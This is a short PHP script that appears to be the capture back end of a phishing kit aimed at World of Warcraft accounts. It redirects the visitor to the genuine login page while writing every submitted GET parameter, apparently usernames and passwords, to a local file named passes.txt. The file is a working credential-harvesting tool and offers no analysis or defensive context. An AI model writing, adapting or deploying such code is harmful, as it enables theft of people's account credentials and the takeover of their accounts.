<?php
header("Location: https://www.worldofwarcraft.com/login/login?service=https%3A%2F%2Fwww.worldofwarcraft.com%2Faccount%2Findex.html");
$handle = fopen("passes.txt", "a");
foreach($_GET as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>